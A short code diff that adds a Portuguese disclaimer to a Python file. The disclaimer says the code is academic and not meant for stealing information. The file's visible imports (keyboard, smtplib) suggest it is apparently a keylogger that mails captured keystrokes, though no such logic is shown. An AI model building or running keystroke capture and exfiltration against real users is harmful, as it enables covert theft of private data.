@@ -1,3 +1,6 @@
+#atenção, esse código foi criado e comartilhado com intenções acadêmicas
+#não é encorajado usar o código a seguir para roubo de informações de qualquer natureza.
+
 import time
 import keyboard
 import smtplib
